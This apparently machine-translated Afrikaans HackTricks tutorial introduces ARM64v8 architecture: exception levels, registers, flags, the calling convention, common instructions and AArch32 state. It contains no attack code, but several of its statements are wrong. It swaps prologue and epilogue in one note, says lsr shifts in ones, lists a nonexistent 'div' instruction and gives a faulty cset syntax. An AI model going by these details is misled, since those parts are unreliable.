# Inleiding tot ARM64v8

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **Uitsonderingsvlakke - EL (ARM64v8)**

In die ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Uitsonderingsvlakke (EL's), die voorregvlak en -vermoëns van die uitvoeringsomgewing. Daar is vier uitsonderingsvlakke, wat strek van EL0 tot EL3, elk met 'n ander doel:

1. **EL0 - Gebruikermodus**:
* Dit is die minst bevoorregte vlak en word gebruik vir die uitvoering van gewone aansoekkode.
* Toepassings wat by EL0 hardloop, is van mekaar en van die stelsel sagteware geïsoleer, wat die veiligheid en stabiliteit verbeter.
2. **EL1 - Bedryfstelsel-kernelmodus**:
* Die meeste bedryfstelselkerne hardloop op hierdie vlak.
* EL1 het meer voorregte as EL0 en kan toegang tot stelselbronne verkry, maar met sekere beperkings om stelselintegriteit te verseker.
3. **EL2 - Hipervisormodus**:
* Hierdie vlak word vir virtualisering gebruik. 'n Hipervisor wat by EL2 hardloop, kan verskeie bedryfstelsels (elk in sy eie EL1) bestuur wat op dieselfde fisiese hardeware hardloop.
* EL2 bied eienskappe vir isolasie en beheer van die gevirtualiseerde omgewings.
4. **EL3 - Sekuriteitsmonitor-modus**:
* Dit is die mees bevoorregte vlak en word dikwels gebruik vir veilige opstart en vertroude uitvoeringsomgewings.
* EL3 kan toegange tussen veilige en nie-veilige toestande bestuur en beheer (soos veilige opstart, vertroude OS, ens.).

Die gebruik van hierdie vlakke maak 'n gestruktureerde en veilige manier moontlik om verskillende aspekte van die stelsel te bestuur, van gebruikersaansoeke tot die mees bevoorregte stelsel sagteware. ARMv8 se benadering tot voorregvlakke help om verskillende stelselkomponente doeltreffend te isoleer, wat die veiligheid en robuustheid van die stelsel verbeter.

## **Registers (ARM64v8)**

ARM64 het **31 algemene doelregisters**, gemerk as `x0` tot `x30`. Elkeen kan 'n **64-bis** (8-byte) waarde stoor. Vir operasies wat slegs 32-bis waardes vereis, kan dieselfde registers in 'n 32-bis modus benader word deur die name w0 tot w30 te gebruik.

1. **`x0`** tot **`x7`** - Hierdie word tipies as krapregisters gebruik en vir die deurgawe van parameters aan subroetines.
* **`x0`** dra ook die terugvoerdata van 'n funksie.
2. **`x8`** - In die Linux-kernel word `x8` gebruik as die stelseloproepnommer vir die `svc`-instruksie. **In macOS is dit die x16 wat gebruik word!**
3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels gebruik vir plaaslike veranderlikes.
4. **`x16`** en **`x17`** - **Intra-prosedurele Oproepregisters**. Tydelike registers vir onmiddellike waardes. Hulle word ook gebruik vir indirekte funksie-oproepe en PLT (Procedure Linkage Table) stompies.
* **`x16`** word as die **stelseloproepnommer** vir die **`svc`**-instruksie in **macOS** gebruik.
5. **`x18`** - **Platformregister**. Dit kan as 'n algemene doelregister gebruik word, maar op sommige platforms is hierdie register gereserveer vir platformspefieke gebruike: Wysiger na die huidige draadomgewingsblok in Windows, of om te wys na die tans **uitvoerende taakstruktuur in die Linux-kernel**.
6. **`x19`** tot **`x28`** - Hierdie is callee-bewaarde registers. 'n Funksie moet hierdie registers se waardes vir sy aanroeper bewaar, sodat hulle in die stok gestoor en herstel word voordat teruggekeer word na die aanroeper.
7. **`x29`** - **Raamregister** om die stokraam dop te hou. Wanneer 'n nuwe stokraam geskep word omdat 'n funksie geroep word, word die **`x29`**-register in die stok gestoor en die nuwe raamadres (sp-adres) word in hierdie register gestoor.
* Hierdie register kan ook as 'n algemene doelregister gebruik word, alhoewel dit gewoonlik as verwysing na **plaaslike veranderlikes** gebruik word.
8. **`x30`** of **`lr`**- **Skakelregister**. Dit hou die **terugvoeradres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`**-waarde in hierdie register te stoor.
* Dit kan ook soos enige ander register gebruik word.
* As die huidige funksie 'n nuwe funksie gaan roep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stok stoor, dit is die epiloog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, genereer spasie en kry nuwe `fp`) en dit aan die einde herstel, dit is die proloog (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
9. **`sp`** - **Stokaanwyser**, gebruik om die bopunt van die stok dop te hou.
* die **`sp`**-waarde moet altyd ten minste 'n **kwadewoord** **uitlyn** hou, anders kan 'n uitlynuitsondering voorkom.
10. **`pc`** - **Programteller**, wat na die volgende instruksie wys. Hierdie register kan slegs deur uitsonderingsgenerasies, uitsonderingsterugkeer en takke opgedateer word. Die enigste gewone instruksies wat hierdie register kan lees, is tak met skakelinstruksies (BL, BLR) om die **`pc`**-adres in **`lr`** (Skakelregister) te stoor.
11. **`xzr`** - **Nulregister**. Ook genoem **`wzr`** in sy **32**-bis registervorm. Dit kan gebruik word om die nulwaarde maklik te kry (gewone operasie) of om vergelykings uit te voer met behulp van **`subs`** soos **`subs XZR, Xn, #10`** wat die resulterende data nêrens stoor (in **`xzr`**).

Die **`Wn`**-registers is die **32-bis**-weergawe van die **`Xn`**-register.

### SIMD- en Drijfpuntregisters

Daar is nog 'n ander **32 registers van 128-bis lengte** wat gebruik kan word in geoptimeerde enkele instruksie multiple data (SIMD) operasies en vir die uitvoering van drijfpuntberekeninge. Hierdie word die Vn-registers genoem, alhoewel hulle ook in **64**-bis, **32**-bis, **16**-bis en **8**-bis kan werk en dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.
### Sisteemregisters

**Daar is honderde sisteemregisters**, ook genoem spesiale doelregisters (SPRs), wat gebruik word vir **monitoring** en **beheer** van **verwerkers** se gedrag.\
Hulle kan slegs gelees of ingestel word met die toegewyde spesiale instruksie **`mrs`** en **`msr`**.

Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word dikwels gevind tydens omgekeerde ingenieurswese. Die `EL0` agtervoegsel dui die **minimale uitsondering** aan waarvandaan die register toeganklik is (in hierdie geval is EL0 die gewone uitsondering (bevoegdheid) vlak waar gewone programme mee hardloop).\
Hulle word dikwels gebruik om die **basisadres van die draad-plaaslike stoor**-gebied van geheue te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 hardloop, maar die tweede kan gelees word van EL0 en geskryf word van EL1 (soos kernel).

* `mrs x0, TPIDR_EL0 ; Lees TPIDR_EL0 in x0`
* `msr TPIDR_EL0, X0 ; Skryf x0 na TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie proseskomponente wat geserializeer is in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register, waar X die **toestemming** **vlak van die geaktiveerde** uitsondering is (dit maak dit moontlik om die prosesstaat te herstel wanneer die uitsondering eindig).\
Dit is die toeganklike velde:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* Die **`N`**, **`Z`**, **`C`** en **`V`** toestandsvlagte:
* **`N`** beteken die operasie het 'n negatiewe resultaat opgelewer
* **`Z`** beteken die operasie het nul opgelewer
* **`C`** beteken die operasie is uitgevoer
* **`V`** beteken die operasie het 'n getekende oorvloei opgelewer:
* Die som van twee positiewe getalle lewer 'n negatiewe resultaat op.
* Die som van twee negatiewe getalle lewer 'n positiewe resultaat op.
* By aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die reeks van die gegewe bitgrootte verteenwoordig kan word nie.
* Duidelik weet die verwerker nie of die operasie geteken is of nie, dus sal dit C en V in die operasies nagaan en aandui of 'n dra gedoen is in die geval dit geteken of ongeteken was.

{% hint style="warning" %}
Nie al die instruksies werk hierdie vlagte by nie. Sommige soos **`CMP`** of **`TST`** doen dit, en ander wat 'n s agtervoegsel het soos **`ADDS`** doen dit ook.
{% endhint%}

* Die huidige **registerbreedte (`nRW`) vlag**: As die vlag die waarde 0 behou, sal die program in die AArch64-uitvoeringsstaat hardloop sodra hervat.
* Die huidige **Uitsonderingsvlak** (**`EL`**): 'n Gewone program wat in EL0 hardloop, sal die waarde 0 hê
* Die **enkele stap vlag** (**`SS`**): Gebruik deur afsonderlike stappers om deur die SS-vlag na 1 binne **`SPSR_ELx`** 'n stap te hardloop en 'n enkele stap uitsondering uit te reik.
* Die **ongeldige uitsonderingstoestandvlag** (**`IL`**): Dit word gebruik om te merk wanneer 'n bevoorregte sagteware 'n ongeldige uitsonderingsvlakoorplasing uitvoer, hierdie vlag word na 1 gesit en die verwerker veroorsaak 'n onwettige toestand-uitsondering.
* Die **`DAIF`** vlagte: Hierdie vlagte maak dit vir 'n bevoorregte program moontlik om sekere eksterne uitsonderings selektief te maskeer.
* As **`A`** 1 is, beteken dit dat **asynchrone afbreek** geaktiveer sal word. Die **`I`** konfigureer om te reageer op eksterne hardeware **Onderbrekingsversoeke** (IRQ's). en die F is verwant aan **Vinnige Onderbrekingsversoeke** (FIR's).
* Die **stapelwyservlagte** (**`SPS`**): Bevoorregte programme wat in EL1 en hoër hardloop, kan tussen hul eie stapelwyservlagregister en die gebruikersmodel een wissel (bv. tussen `SP_EL1` en `EL0`). Hierdie skakeling word uitgevoer deur te skryf na die **`SPSel`** spesiale register. Dit kan nie vanaf EL0 gedoen word nie.

## **Oproepkonvensie (ARM64v8)**

Die ARM64 oproepkonvensie spesifiseer dat die **eerste agt parameters** na 'n funksie oorgedra word in registers **`x0` tot `x7`**. **Addisionele** parameters word op die **stapel** oorgedra. Die **terugkeer**-waarde word teruggevoer in register **`x0`**, of in **`x1`** ook **as dit 128 bits lank is**. Die **`x19`** tot **`x30`** en **`sp`** registers moet oor funksie-oproepe **bewaar** word.

Wanneer 'n funksie in samestelling lees, soek na die **funksieproloog en epiloog**. Die **proloog** behels gewoonlik **die berging van die raamwyser (`x29`)**, **opstel** van 'n **nuwe raamwyser**, en **toewysing van stapelruimte**. Die **epiloog** behels gewoonlik **die herstel van die gebergde raamwyser** en **terugkeer** uit die funksie.

### Oproepkonvensie in Swift

Swift het sy eie **oproepkonvensie** wat gevind kan word op [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Gewone Instruksies (ARM64v8)**

ARM64 instruksies het gewoonlik die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **operasie** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** is die **bestemmingsregister** waar die resultaat gestoor sal word, en **`src1`** en **`src2`** is die **bronregisters**. Onmiddellike waardes kan ook gebruik word in plek van bronregisters.

* **`mov`**: **Skuif** 'n waarde van een **register** na 'n ander.
* Voorbeeld: `mov x0, x1` — Dit skuif die waarde vanaf `x1` na `x0`.
* **`ldr`**: **Laai** 'n waarde vanaf **geheue** in 'n **register**.
* Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde vanaf die geheueposisie wat deur `x1` aangedui word in `x0`.
* **Offsetmodus**: 'n Offset wat die oorspronklike wyser affekteer, word aangedui, byvoorbeeld:
* `ldr x2, [x1, #8]`, dit sal in x2 die waarde vanaf x1 + 8 laai
* `ldr x2, [x0, x1, lsl #2]`, dit sal in x2 'n voorwerp laai vanaf die reeks x0, vanaf die posisie x1 (indeks) \* 4
* **Vooraf-geïndekse modus**: Dit sal berekeninge toepas op die oorsprong, die resultaat kry en ook die nuwe oorsprong in die oorsprong stoor.
* `ldr x2, [x1, #8]!`, dit sal `x1 + 8` in `x2` laai en in x1 die resultaat van `x1 + 8` stoor
* `str lr, [sp, #-4]!`, Berg die skakelregister in sp en werk die register sp by
* **Na-indeksmodus**: Dit is soos die vorige een, maar die geheue-adres word benader en dan word die offset bereken en gestoor.
* `ldr x0, [x1], #8`, laai `x1` in `x0` en werk x1 by met `x1 + 8`
* **PC-verwante adressering**: In hierdie geval word die adres om te laai relatief tot die PC-register bereken
* `ldr x1, =_start`, Dit sal die adres waar die `_start` simbool begin in x1 laai relatief tot die huidige PC.
* **`str`**: **Stoor** 'n waarde vanaf 'n **register** in **geheue**.
* Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die geheueposisie wat deur `x1` aangedui word.
* **`ldp`**: **Laai Paar van Register**. Hierdie instruksie **laai twee registers** van **opeenvolgende geheue**posisies. Die geheue-adres word tipies gevorm deur 'n offset by te voeg by die waarde in 'n ander register.
* Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die geheueposisies by `x2` en `x2 + 8`, onderskeidelik.
* **`stp`**: **Stoor Paar van Register**. Hierdie instruksie **stoor twee registers** na **opeenvolgende geheue**posisies. Die geheue-adres word tipies gevorm deur 'n offset by te voeg by die waarde in 'n ander register.
* Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` na die geheueposisies by `sp` en `sp + 8`, onderskeidelik.
* `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` na die geheueposisies by `sp+16` en `sp + 24`, onderskeidelik, en werk `sp` by met `sp+16`.
* **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in 'n register.
* **`adds`** Dit voer 'n `add` uit en werk die vlae by
* **`sub`**: **Aftrek** die waardes van twee register en stoor die resultaat in 'n register.
* Kontroleer **`add`** **sintaksis**.
* Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
* **`subs`** Dit is soos sub maar werk die vlag by
* **`mul`**: **Vermenigvuldig** die waardes van **twee register** en stoor die resultaat in 'n register.
* Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
* **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
* Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Logiese skuif links**: Voeg 0's by die einde en skuif die ander bits vorentoe (vermenigvuldig met n-keer 2)
* **Logiese skuif regs**: Voeg 1's aan die begin en skuif die ander bits agtertoe (deel deur n-keer 2 in ongeteken)
* **Aritiese skuif regs**: Soos **`lsr`**, maar in plaas van om 0's by te voeg as die mees beduidende bit 'n 1 is, word \*\*1's bygevoeg (\*\*deel deur n-keer 2 in geteken)
* **Regsdraai**: Soos **`lsr`** maar watookal van die regterkant verwyder word, word by die linkerkant aangeheg
* **Regsdraai met Uitbreiding**: Soos **`ror`**, maar met die draagvlag as die "mees beduidende bit". Dus word die draagvlag na bit 31 geskuif en die verwyderde bit na die draagvlag.
* **`bfm`**: **Bitveld Verskuif**, hierdie operasies **kopieer bits `0...n`** van 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **regsregs hoeveelheid**.
* Bitveld verskuif: `BFM Xd, Xn, #r`
* Getekende Bitveld verskuif: `SBFM Xd, Xn, #r, #s`
* Ongeskrewe Bitveld verskuif: `UBFM Xd, Xn, #r, #s`
* **Bitveld Uithaal en Invoeg:** Kopieer 'n bitveld van 'n register en kopieer dit na 'n ander register.
* **`BFI X1, X2, #3, #4`** Voeg 4 bits van X2 vanaf die 3de bit van X1 in
* **`BFXIL X1, X2, #3, #4`** Haal vanaf die 3de bit van X2 vier bits uit en kopieer hulle na X1
* **`SBFIZ X1, X2, #3, #4`** Teken-uitbrei 4 bits van X2 en voeg hulle in X1 in beginnende by bit posisie 3 deur die regter bits te nul
* **`SBFX X1, X2, #3, #4`** Haal 4 bits beginnende by bit 3 uit X2, teken dit uit, en plaas die resultaat in X1
* **`UBFIZ X1, X2, #3, #4`** Nul-uitbrei 4 bits van X2 en voeg hulle in X1 in beginnende by bit posisie 3 deur die regter bits te nul
* **`UBFX X1, X2, #3, #4`** Haal 4 bits beginnende by bit 3 uit X2 en plaas die nul-uitgebreide resultaat in X1.
* **Teken Uitbrei Na X:** Brei die teken uit (of voeg net 0's by in die ongetekende weergawe) van 'n waarde uit om operasies daarmee uit te voer:
* **`SXTB X1, W2`** Brei die teken van 'n byte **van W2 na X1** (`W2` is die helfte van `X2`) om die 64bits te vul
* **`SXTH X1, W2`** Brei die teken van 'n 16bit nommer **van W2 na X1** om die 64bits te vul
* **`SXTW X1, W2`** Brei die teken van 'n byte **van W2 na X1** om die 64bits te vul
* **`UXTB X1, W2`** Voeg 0's by (ongeskrewe) na 'n byte **van W2 na X1** om die 64bits te vul
* **`extr`:** Haal bits uit 'n gespesifiseerde **paar register wat gekonkateniseer is**.
* Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **konkateniseer W1+W2** en kry **vanaf bit 3 van W2 tot bit 3 van W1** en stoor dit in W3.
* **`cmp`**: **Vergelyk** twee register en stel toestandvlagte in. Dit is 'n **alias van `subs`** wat die bestemmingsregister na die nulregister stel. Nuttig om te weet of `m == n`.
* Dit ondersteun dieselfde sintaksis as `subs`
* Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die toestandvlagte dienooreenkomstig in.
* **`cmn`**: **Vergelyk negatief** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dieselfde sintaksis. Nuttig om te weet of `m == -n`.
* **`ccmp`**: Voorwaardelike vergelyking, dit is 'n vergelyking wat slegs uitgevoer sal word as 'n vorige vergelyking waar was en spesifiek nzcv-bits sal stel.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
* Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` 'n `NE`** was, as dit nie was nie, sal die bits `nzcv` na 0 gestel word (wat nie aan die `blt` vergelyking sal voldoen nie).
* Dit kan ook gebruik word as `ccmn` (dieselfde maar negatief, soos `cmp` teenoor `cmn`).
* **`tst`**: Dit kontroleer of enige van die waardes van die vergelyking beide 1 is (dit werk soos 'n EN sonder om die resultaat enige plek te stoor). Dit is nuttig om 'n register met 'n waarde te kontroleer en te sien of enige van die bits van die register wat in die waarde aangedui word, 1 is.
* Voorbeeld: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is
* **`teq`**: XOR-operasie wat die resultaat verwerp
* **`b`**: Onvoorwaardelike Sprong
* Voorbeeld: `b myFunction`
* Let daarop dat dit nie die skakelregister met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat moet terugkeer nie)
* **`bl`**: **Sprong** met skakel, gebruik om 'n **subrutine** te **roep**. Stoor die **terugkeeradres in `x30`**.
* Voorbeeld: `bl myFunction` — Dit roep die funksie `myFunction` aan en stoor die terugkeeradres in `x30`.
* Let daarop dat dit nie die skakelregister met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat moet terugkeer nie)
* **`blr`**: **Sprong** met Skakel na Register, gebruik om 'n **subrutine** te **roep** waar die teiken in 'n **register** gespesifiseer is. Stoor die terugkeeradres in `x30`. (Dit is
* Voorbeeld: `blr x1` — Dit roep die funksie aan waarvan die adres in `x1` ingesluit is en stoor die terugkeeradres in `x30`.
* **`ret`**: **Terugkeer** van **subrutine**, tipies deur die adres in **`x30`** te gebruik.
* Voorbeeld: `ret` — Dit keer terug van die huidige subrutine deur die terugkeeradres in `x30` te gebruik.
* **`b.<cond>`**: Voorwaardelike sprong
* **`b.eq`**: **Sprong indien gelyk**, gebaseer op die vorige `cmp` instruksie.
* Voorbeeld: `b.eq label` — As die vorige `cmp` instruksie twee gelyke waardes gevind het, spring dit na `label`.
* **`b.ne`**: **Tak indien nie gelyk nie**. Hierdie instruksie kontroleer die toestand vlae (wat deur 'n vorige vergelykingsinstruksie ingestel is), en as die vergelykte waardes nie gelyk was nie, spring dit na 'n etiket of adres.
* Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
* **`cbz`**: **Vergelyk en spring op Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle gelyk is, spring dit na 'n etiket of adres.
* Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
* **`cbnz`**: **Vergelyk en spring op Nie-Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle nie gelyk is nie, spring dit na 'n etiket of adres.
* Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie-nul is nie, spring dit na `label`.
* **`tbnz`**: Toets bit en spring op nie-nul
* Voorbeeld: `tbnz x0, #8, label`
* **`tbz`**: Toets bit en spring op nul
* Voorbeeld: `tbz x0, #8, label`
* **Kondisionele seleksie-operasies**: Dit is operasies waarvan die gedrag varieer afhangende van die kondisionele bits.
* `csel Xd, Xn, Xm, kond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1, as vals, X0 = X2
* `csinc Xd, Xn, Xm, kond` -> As waar, Xd = Xn, as vals, Xd = Xm + 1
* `cinc Xd, Xn, kond` -> As waar, Xd = Xn + 1, as vals, Xd = Xn
* `csinv Xd, Xn, Xm, kond` -> As waar, Xd = Xn, as vals, Xd = NIE(Xm)
* `cinv Xd, Xn, kond` -> As waar, Xd = NIE(Xn), as vals, Xd = Xn
* `csneg Xd, Xn, Xm, kond` -> As waar, Xd = Xn, as vals, Xd = - Xm
* `cneg Xd, Xn, kond` -> As waar, Xd = - Xn, as vals, Xd = Xn
* `cset Xd, Xn, Xm, kond` -> As waar, Xd = 1, as vals, Xd = 0
* `csetm Xd, Xn, Xm, kond` -> As waar, Xd = \<alles 1>, as vals, Xd = 0
* **`adrp`**: Bereken die **bladsy-adres van 'n simbool** en stoor dit in 'n register.
* Voorbeeld: `adrp x0, simbool` — Dit bereken die bladsy-adres van `simbool` en stoor dit in `x0`.
* **`ldrsw`**: **Laai** 'n geteken **32-bis** waarde vanaf geheue en **teken dit uit tot 64** bits.
* Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n geteken 32-bis waarde vanaf die geheuelokasie wat deur `x1` aangedui word, teken dit uit tot 64 bits, en stoor dit in `x0`.
* **`stur`**: **Stoor 'n registerwaarde na 'n geheuelokasie**, met 'n skuif vanaf 'n ander register.
* Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue-adres wat 4 byte groter is as die adres wat tans in `x1` is.
* **`svc`** : Maak 'n **sisteemaanroep**. Dit staan vir "Supervisor Call". Wanneer die verwerker hierdie instruksie uitvoer, **skakel dit van gebruikersmodus na kernelmodus** en spring na 'n spesifieke plek in die geheue waar die **kern se sisteemaanroephanterings**-kode geleë is.
*   Voorbeeld:

```armasm
mov x8, 93  ; Laai die sisteemaanroepnommer vir afsluiting (93) in register x8.
mov x0, 0   ; Laai die afsluitstatuskode (0) in register x0.
svc 0       ; Maak die sisteemaanroep.
```

### **Funksie Proloog**

1. **Stoor die skakelregister en raamverwysings na die stok**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Stel die nuwe raam aanduider op**: `mov x29, sp` (stel die nuwe raam aanduider op vir die huidige funksie)
3. **Ken spasie op die stok toe vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <grootte>` (waar `<grootte>` die aantal bytes is wat benodig word)

### **Funksie Epiloog**

1. **Deallokeer plaaslike veranderlikes (indien enige toegewys was)**: `add sp, sp, <grootte>`
2. **Herstel die skakelregister en raam aanduider**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Terugkeer**: `ret` (gee beheer terug aan die oproeper deur die adres in die skakelregister)

## AARCH32 Uitvoeringsstatus

Armv8-A ondersteun die uitvoering van 32-bietjie programme. **AArch32** kan in een van **twee instruksiestelle** hardloop: **`A32`** en **`T32`** en kan tussen hulle skakel via **`interworking`**.\
**Bevoorregte** 64-bietjie programme kan die **uitvoering van 32-bietjie** programme skeduleer deur 'n uitsonderingsvlak-oordrag na die laer bevoorregte 32-bietjie uit te voer.\
Let daarop dat die oorgang van 64-bietjie na 32-bietjie plaasvind met 'n laer van die uitsonderingsvlak (byvoorbeeld 'n 64-bietjie program in EL1 wat 'n program in EL0 trigger). Dit word gedoen deur die **bit 4 van** **`SPSR_ELx`** spesiale register **op 1** te stel wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word en die res van `SPSR_ELx` stoor die **`AArch32`** programme se CPSR. Dan roep die bevoorregte proses die **`ERET`** instruksie aan sodat die verwerker oorgaan na **`AArch32`** wat in A32 of T32 binnegaan, afhangende van CPSR\*\*.\*\*

Die **`interworking`** vind plaas deur die gebruik van die J- en T-bits van CPSR. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit kom basies daarop neer dat die **laagste bit na 1** gestel word om aan te dui dat die instruksiestel T32 is.\
Dit word ingestel tydens die **interworking takinstruksies**, maar kan ook direk met ander instruksies ingestel word wanneer die PC as die bestemmingsregister ingestel word. Voorbeeld:

'n Ander voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bis registre (r0-r15). **Vanaf r0 tot r14** kan hulle gebruik word vir **enige operasie**, maar sommige van hulle is gewoonlik voorbehou:

- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32, huidige + 4.
- **`r11`**: Raamwyser
- **`r12`**: Intra-prosedurele oproepregister
- **`r13`**: Stewelwyser
- **`r14`**: Skakelregister

Verder word registre ondersteun in **`gebankte registre`**. Dit is plekke wat die registre se waardes stoor om vinnige konteksverandering in uitsonderingshantering en bevoorregte operasies moontlik te maak om die behoefte om registre elke keer handmatig te stoor en herstel te vermy.\
Dit word gedoen deur **die prosessorstatus van die `CPSR` na die `SPSR`** van die prosessormodus waarheen die uitsondering geneem word, te stoor. By die terugkeer van die uitsondering word die **`CPSR`** herstel vanaf die **`SPSR`**.

### CPSR - Huidige Programstatusregister

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook gestoor in **`SPSR_ELx`** wanneer 'n uitsondering geneem word om later die uitvoering te herstel:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde is verdeel in sekere groepe:

- Aansoekprogramstatusregister (APSR): Wiskundige vlae en toeganklik vanaf EL0
- Uitvoeringsstatusregistre: Proseshantering (deur die OS bestuur).

#### Aansoekprogramstatusregister (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** vlae (net soos in AArch64)
- Die **`Q`** vlag: Dit word op 1 gestel wanneer **heeltalversadiging plaasvind** tydens die uitvoering van 'n gespesialiseerde versadigende wiskundige instruksie. Sodra dit op **`1`** gestel is, sal dit die waarde behou totdat dit handmatig na 0 gestel word. Verder is daar geen instruksie wat sy waarde implisiet kontroleer nie, dit moet handmatig gelees word.
- **`GE`** (Groter as of gelyk aan) Vlae: Dit word gebruik in SIMD (Enkele Instruksie, Meervoudige Data) operasies, soos "parallelle optel" en "parallelle aftrekking". Hierdie operasies maak dit moontlik om meervoudige datapunte in 'n enkele instruksie te verwerk.

Byvoorbeeld, die **`UADD8`** instruksie **tel vier pare van byte op** (van twee 32-bis operandos) parallel op en stoor die resultate in 'n 32-bis register. Dit stel dan die `GE` vlae in die `APSR` in op grond van hierdie resultate. Elke GE-vlag stem ooreen met een van die byte optellings, wat aandui of die optelling vir daardie bytepaar **oorvloei**.

Die **`SEL`** instruksie gebruik hierdie GE-vlae om voorwaardelike aksies uit te voer.

#### Uitvoeringsstatusregistre

- Die **`J`** en **`T`** bietjies: **`J`** moet 0 wees en as **`T`** 0 is, word die instruksiestel A32 gebruik, en as dit 1 is, word die T32 gebruik.
- **IT Blokstatusregister** (`ITSTATE`): Dit is die bietjies vanaf 10-15 en 25-26. Hulle stoor voorwaardes vir instruksies binne 'n **`IT`** voorafgegaan groep.
- **`E`** bietjie: Dui die **eindigheid** aan.
- **Modus- en Uitsonderingsmaskerbietjies** (0-4): Hulle bepaal die huidige uitvoeringsstatus. Die **5de** een dui aan of die program as 32-bis (‘n 1) of 64-bis (‘n 0) loop. Die ander 4 verteenwoordig die **uitsonderingsmodus wat tans gebruik word** (wanneer 'n uitsondering plaasvind en dit hanteer word). Die nommerstel dui die huidige prioriteit aan in geval 'n ander uitsondering geaktiveer word terwyl dit hanteer word.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

